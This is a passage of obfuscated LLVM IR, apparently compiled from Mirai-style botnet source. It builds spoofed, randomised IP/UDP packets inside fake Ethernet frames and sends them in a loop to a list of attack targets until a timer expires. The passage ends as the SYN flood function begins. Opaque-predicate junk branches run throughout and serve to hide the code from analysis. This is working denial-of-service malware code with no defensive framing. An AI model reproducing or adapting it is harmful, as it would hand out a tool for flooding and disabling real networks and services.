  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.udphdr*
  store %struct.udphdr* %337, %struct.udphdr** %38, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i64 1
  %340 = bitcast %struct.udphdr* %339 to i8*
  store i8* %340, i8** %39, align 8
  %341 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %342 = load i32, i32* %11, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i64 %343
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i32 0, i32 2
  %346 = load i8, i8* %345, align 4
  %347 = zext i8 %346 to i32
  %348 = icmp slt i32 %347, 32
  br i1 %348, label %349, label %370

; <label>:349:                                    ; preds = %318
  %350 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %351 = load i32, i32* %11, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i64 %352
  %354 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i32 0, i32 1
  %355 = load i32, i32* %354, align 4
  %356 = call i32 @ntohl(i32 %355) #7
  %357 = call i32 @rand_next()
  %358 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %359 = load i32, i32* %11, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i64 %360
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i32 0, i32 2
  %363 = load i8, i8* %362, align 4
  %364 = zext i8 %363 to i32
  %365 = lshr i32 %357, %364
  %366 = add i32 %356, %365
  %367 = call i32 @htonl(i32 %366) #7
  %368 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 9
  store i32 %367, i32* %369, align 4
  br label %370

; <label>:370:                                    ; preds = %349, %318
  %371 = load i32, i32* @x.21
  %372 = load i32, i32* @y.22
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %370
  %379 = load i32, i32* %23, align 4
  %380 = icmp eq i32 %379, -1
  %381 = load i32, i32* @x.21
  %382 = load i32, i32* @y.22
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %380, label %389, label %393

; <label>:389:                                    ; preds = %originalBBpart212
  %390 = call i32 @rand_next()
  %391 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 8
  store i32 %390, i32* %392, align 4
  br label %393

; <label>:393:                                    ; preds = %389, %originalBBpart212
  %394 = load i16, i16* %15, align 2
  %395 = zext i16 %394 to i32
  %396 = icmp eq i32 %395, 65535
  br i1 %396, label %397, label %412

; <label>:397:                                    ; preds = %393
  %398 = call i32 @rand_next()
  %399 = and i32 %398, 65535
  %400 = trunc i32 %399 to i16
  %401 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 3
  store i16 %400, i16* %402, align 4
  %403 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 3
  %405 = load i16, i16* %404, align 4
  %406 = zext i16 %405 to i32
  %407 = sub nsw i32 %406, 1000
  %408 = xor i32 %407, -1
  %409 = trunc i32 %408 to i16
  %410 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 3
  store i16 %409, i16* %411, align 4
  br label %412

; <label>:412:                                    ; preds = %397, %393
  %413 = load i16, i16* %18, align 2
  %414 = zext i16 %413 to i32
  %415 = icmp eq i32 %414, 65535
  br i1 %415, label %416, label %438

; <label>:416:                                    ; preds = %412
  %417 = load i32, i32* @x.21
  %418 = load i32, i32* @y.22
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %416
  %425 = call i32 @rand_next()
  %426 = and i32 %425, 65535
  %427 = trunc i32 %426 to i16
  %428 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 0
  store i16 %427, i16* %429, align 2
  %430 = load i32, i32* @x.21
  %431 = load i32, i32* @y.22
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart224, label %originalBB14alteredBB

originalBBpart224:                                ; preds = %originalBB14
  br label %438

; <label>:438:                                    ; preds = %originalBBpart224, %412
  %439 = load i16, i16* %19, align 2
  %440 = zext i16 %439 to i32
  %441 = icmp eq i32 %440, 65535
  br i1 %441, label %442, label %448

; <label>:442:                                    ; preds = %438
  %443 = call i32 @rand_next()
  %444 = and i32 %443, 65535
  %445 = trunc i32 %444 to i16
  %446 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %447 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %446, i32 0, i32 1
  store i16 %445, i16* %447, align 2
  br label %448

; <label>:448:                                    ; preds = %442, %438
  %449 = load i32, i32* @x.21
  %450 = load i32, i32* @y.22
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %448
  %457 = load i8, i8* %22, align 1
  %458 = icmp ne i8 %457, 0
  %459 = load i32, i32* @x.21
  %460 = load i32, i32* @y.22
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %458, label %471, label %467

; <label>:467:                                    ; preds = %originalBBpart228
  %468 = call i32 @rand_next()
  %469 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 9
  store i32 %468, i32* %470, align 4
  br label %493

; <label>:471:                                    ; preds = %originalBBpart228
  %472 = load i32, i32* @x.21
  %473 = load i32, i32* @y.22
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %471
  %480 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 9
  %482 = load i32, i32* %481, align 4
  %483 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 9
  store i32 %482, i32* %484, align 4
  %485 = load i32, i32* @x.21
  %486 = load i32, i32* @y.22
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %493

; <label>:493:                                    ; preds = %originalBBpart232, %467
  %494 = load i32, i32* @x.21
  %495 = load i32, i32* @y.22
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %493
  %502 = call i32 @rand_next()
  store i32 %502, i32* %40, align 4
  %503 = call i32 @rand_next()
  store i32 %503, i32* %41, align 4
  %504 = call i32 @rand_next()
  store i32 %504, i32* %42, align 4
  %505 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %506 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %505, i32 0, i32 0
  %507 = getelementptr inbounds [6 x i8], [6 x i8]* %506, i32 0, i32 0
  %508 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %507, i8* %508, i32 4)
  %509 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %510 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %509, i32 0, i32 1
  %511 = getelementptr inbounds [6 x i8], [6 x i8]* %510, i32 0, i32 0
  %512 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %511, i8* %512, i32 4)
  %513 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %514 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %513, i32 0, i32 0
  %515 = getelementptr inbounds [6 x i8], [6 x i8]* %514, i32 0, i32 0
  %516 = getelementptr inbounds i8, i8* %515, i64 4
  %517 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %516, i8* %517, i32 2)
  %518 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %519 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %518, i32 0, i32 1
  %520 = getelementptr inbounds [6 x i8], [6 x i8]* %519, i32 0, i32 0
  %521 = getelementptr inbounds i8, i8* %520, i64 4
  %522 = bitcast i32* %42 to i8*
  %523 = getelementptr inbounds i8, i8* %522, i64 2
  call void @util_memcpy(i8* %521, i8* %523, i32 2)
  %524 = load i8, i8* %21, align 1
  %525 = icmp ne i8 %524, 0
  %526 = load i32, i32* @x.21
  %527 = load i32, i32* @y.22
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %525, label %534, label %541

; <label>:534:                                    ; preds = %originalBBpart236
  %535 = load i8*, i8** %39, align 8
  %536 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %535, i32 %536)
  %537 = load i8*, i8** %39, align 8
  %538 = load i32, i32* %20, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds i8, i8* %537, i64 %539
  store i8 0, i8* %540, align 1
  br label %541

; <label>:541:                                    ; preds = %534, %originalBBpart236
  %542 = load i32, i32* @x.21
  %543 = load i32, i32* @y.22
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %541
  %550 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %551 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %550, i32 0, i32 7
  store i16 0, i16* %551, align 2
  %552 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %553 = bitcast %struct.iphdr* %552 to i16*
  %554 = call zeroext i16 @checksum_generic(i16* %553, i32 20)
  %555 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %556 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %555, i32 0, i32 7
  store i16 %554, i16* %556, align 2
  %557 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %558 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %557, i32 0, i32 7
  store i16 0, i16* %558, align 2
  %559 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %560 = bitcast %struct.iphdr* %559 to i16*
  %561 = call zeroext i16 @checksum_generic(i16* %560, i32 20)
  %562 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %563 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %562, i32 0, i32 7
  store i16 %561, i16* %563, align 2
  %564 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %565 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %564, i32 0, i32 3
  store i16 0, i16* %565, align 2
  %566 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %567 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %568 = bitcast %struct.udphdr* %567 to i8*
  %569 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %570 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %569, i32 0, i32 2
  %571 = load i16, i16* %570, align 2
  %572 = load i32, i32* %20, align 4
  %573 = sext i32 %572 to i64
  %574 = add i64 8, %573
  %575 = trunc i64 %574 to i32
  %576 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %566, i8* %568, i16 zeroext %571, i32 %575)
  %577 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %578 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %577, i32 0, i32 3
  store i16 %576, i16* %578, align 2
  %579 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %580 = load i32, i32* %11, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %579, i64 %581
  %583 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i32 0, i32 0
  %584 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %583, i32 0, i32 0
  store i16 2, i16* %584, align 4
  %585 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 9
  %587 = load i32, i32* %586, align 4
  %588 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %589 = load i32, i32* %11, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %588, i64 %590
  %592 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %591, i32 0, i32 0
  %593 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %592, i32 0, i32 2
  %594 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %593, i32 0, i32 0
  store i32 %587, i32* %594, align 4
  %595 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %596 = load i32, i32* %11, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %595, i64 %597
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %598, i32 0, i32 0
  %600 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %599, i32 0, i32 1
  store i16 0, i16* %600, align 2
  %601 = load i32, i32* %12, align 4
  %602 = load i8*, i8** %33, align 8
  %603 = load i32, i32* %20, align 4
  %604 = sext i32 %603 to i64
  %605 = add i64 66, %604
  %606 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %607 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %608 = load i32, i32* %11, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i64 %609
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i32 0, i32 0
  %612 = bitcast %struct.sockaddr_in* %611 to %struct.sockaddr*
  store %struct.sockaddr* %612, %struct.sockaddr** %606, align 8
  %613 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %614 = load %struct.sockaddr*, %struct.sockaddr** %613, align 8
  %615 = call i64 @sendto(i32 %601, i8* %602, i64 %605, i32 16384, %struct.sockaddr* %614, i32 16)
  %616 = load i32, i32* @x.21
  %617 = load i32, i32* @y.22
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart253, label %originalBB38alteredBB

originalBBpart253:                                ; preds = %originalBB38
  br label %624

; <label>:624:                                    ; preds = %originalBBpart253
  %625 = load i32, i32* @x.21
  %626 = load i32, i32* @y.22
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %624
  %633 = load i32, i32* %11, align 4
  %634 = add nsw i32 %633, 1
  store i32 %634, i32* %11, align 4
  %635 = load i32, i32* @x.21
  %636 = load i32, i32* @y.22
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBBpart266, label %originalBB55alteredBB

originalBBpart266:                                ; preds = %originalBB55
  br label %313

; <label>:643:                                    ; preds = %313
  %644 = call i64 @time(i64* null) #6
  %645 = load i32, i32* %24, align 4
  %646 = sext i32 %645 to i64
  %647 = icmp sgt i64 %644, %646
  br i1 %647, label %648, label %665

; <label>:648:                                    ; preds = %643
  %649 = load i32, i32* @x.21
  %650 = load i32, i32* @y.22
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %648
  %657 = load i32, i32* @x.21
  %658 = load i32, i32* @y.22
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %666

; <label>:665:                                    ; preds = %643
  br label %312

; <label>:666:                                    ; preds = %originalBBpart270, %116, %94
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %95
  store i32 1, i32* %11, align 4
  %667 = load i32, i32* %12, align 4
  %668 = bitcast i32* %11 to i8*
  %669 = call i32 @setsockopt(i32 %667, i32 0, i32 3, i8* %668, i32 4) #6
  %670 = icmp eq i32 %669, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %119
  store i32 0, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %194
  %671 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %672 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %673 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %672, i32 0, i32 4
  store i16 %671, i16* %673, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %370
  %674 = load i32, i32* %23, align 4
  %675 = icmp eq i32 %674, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %416
  %676 = call i32 @rand_next()
  %_ = sub i32 %676, 65535
  %gen = mul i32 %_, 65535
  %_15 = sub i32 0, %676
  %gen16 = add i32 %_15, 65535
  %_17 = shl i32 %676, 65535
  %_18 = sub i32 %676, 65535
  %gen19 = mul i32 %_18, 65535
  %_20 = sub i32 0, %676
  %gen21 = add i32 %_20, 65535
  %_22 = shl i32 %676, 65535
  %677 = and i32 %676, 65535
  %678 = trunc i32 %677 to i16
  %679 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %680 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %679, i32 0, i32 0
  store i16 %678, i16* %680, align 2
  br label %originalBB14

originalBB26alteredBB:                            ; preds = %originalBB26, %448
  %681 = load i8, i8* %22, align 1
  %682 = icmp ne i8 %681, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %471
  %683 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %684 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %683, i32 0, i32 9
  %685 = load i32, i32* %684, align 4
  %686 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %687 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %686, i32 0, i32 9
  store i32 %685, i32* %687, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %493
  %688 = call i32 @rand_next()
  store i32 %688, i32* %40, align 4
  %689 = call i32 @rand_next()
  store i32 %689, i32* %41, align 4
  %690 = call i32 @rand_next()
  store i32 %690, i32* %42, align 4
  %691 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %692 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %691, i32 0, i32 0
  %693 = getelementptr inbounds [6 x i8], [6 x i8]* %692, i32 0, i32 0
  %694 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %693, i8* %694, i32 4)
  %695 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %696 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %695, i32 0, i32 1
  %697 = getelementptr inbounds [6 x i8], [6 x i8]* %696, i32 0, i32 0
  %698 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %697, i8* %698, i32 4)
  %699 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %700 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %699, i32 0, i32 0
  %701 = getelementptr inbounds [6 x i8], [6 x i8]* %700, i32 0, i32 0
  %702 = getelementptr inbounds i8, i8* %701, i64 4
  %703 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %702, i8* %703, i32 2)
  %704 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %705 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %704, i32 0, i32 1
  %706 = getelementptr inbounds [6 x i8], [6 x i8]* %705, i32 0, i32 0
  %707 = getelementptr inbounds i8, i8* %706, i64 4
  %708 = bitcast i32* %42 to i8*
  %709 = getelementptr inbounds i8, i8* %708, i64 2
  call void @util_memcpy(i8* %707, i8* %709, i32 2)
  %710 = load i8, i8* %21, align 1
  %711 = icmp ne i8 %710, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %541
  %712 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %713 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %712, i32 0, i32 7
  store i16 0, i16* %713, align 2
  %714 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %715 = bitcast %struct.iphdr* %714 to i16*
  %716 = call zeroext i16 @checksum_generic(i16* %715, i32 20)
  %717 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %718 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %717, i32 0, i32 7
  store i16 %716, i16* %718, align 2
  %719 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %720 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %719, i32 0, i32 7
  store i16 0, i16* %720, align 2
  %721 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %722 = bitcast %struct.iphdr* %721 to i16*
  %723 = call zeroext i16 @checksum_generic(i16* %722, i32 20)
  %724 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %725 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %724, i32 0, i32 7
  store i16 %723, i16* %725, align 2
  %726 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %727 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %726, i32 0, i32 3
  store i16 0, i16* %727, align 2
  %728 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %729 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %730 = bitcast %struct.udphdr* %729 to i8*
  %731 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %732 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %731, i32 0, i32 2
  %733 = load i16, i16* %732, align 2
  %734 = load i32, i32* %20, align 4
  %735 = sext i32 %734 to i64
  %_39 = sub i64 0, 8
  %gen40 = add i64 %_39, %735
  %736 = add i64 8, %735
  %737 = trunc i64 %736 to i32
  %738 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %728, i8* %730, i16 zeroext %733, i32 %737)
  %739 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %740 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %739, i32 0, i32 3
  store i16 %738, i16* %740, align 2
  %741 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %742 = load i32, i32* %11, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %741, i64 %743
  %745 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %744, i32 0, i32 0
  %746 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %745, i32 0, i32 0
  store i16 2, i16* %746, align 4
  %747 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %748 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %747, i32 0, i32 9
  %749 = load i32, i32* %748, align 4
  %750 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %751 = load i32, i32* %11, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %750, i64 %752
  %754 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %753, i32 0, i32 0
  %755 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %754, i32 0, i32 2
  %756 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %755, i32 0, i32 0
  store i32 %749, i32* %756, align 4
  %757 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %758 = load i32, i32* %11, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %757, i64 %759
  %761 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %760, i32 0, i32 0
  %762 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %761, i32 0, i32 1
  store i16 0, i16* %762, align 2
  %763 = load i32, i32* %12, align 4
  %764 = load i8*, i8** %33, align 8
  %765 = load i32, i32* %20, align 4
  %766 = sext i32 %765 to i64
  %_41 = sub i64 66, %766
  %gen42 = mul i64 %_41, %766
  %_43 = sub i64 66, %766
  %gen44 = mul i64 %_43, %766
  %_45 = shl i64 66, %766
  %_46 = sub i64 66, %766
  %gen47 = mul i64 %_46, %766
  %_48 = sub i64 66, %766
  %gen49 = mul i64 %_48, %766
  %_50 = sub i64 0, 66
  %gen51 = add i64 %_50, %766
  %767 = add i64 66, %766
  %768 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %769 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %770 = load i32, i32* %11, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %769, i64 %771
  %773 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %772, i32 0, i32 0
  %774 = bitcast %struct.sockaddr_in* %773 to %struct.sockaddr*
  store %struct.sockaddr* %774, %struct.sockaddr** %768, align 8
  %775 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %776 = load %struct.sockaddr*, %struct.sockaddr** %775, align 8
  %777 = call i64 @sendto(i32 %763, i8* %764, i64 %767, i32 16384, %struct.sockaddr* %776, i32 16)
  br label %originalBB38

originalBB55alteredBB:                            ; preds = %originalBB55, %624
  %778 = load i32, i32* %11, align 4
  %_56 = sub i32 %778, 1
  %gen57 = mul i32 %_56, 1
  %_58 = shl i32 %778, 1
  %_59 = sub i32 %778, 1
  %gen60 = mul i32 %_59, 1
  %_61 = sub i32 %778, 1
  %gen62 = mul i32 %_61, 1
  %_63 = sub i32 0, %778
  %gen64 = add i32 %_63, 1
  %779 = add nsw i32 %778, 1
  store i32 %779, i32* %11, align 4
  br label %originalBB55

originalBB68alteredBB:                            ; preds = %originalBB68, %648
  br label %originalBB68
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.23
  %7 = load i32, i32* @y.24
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
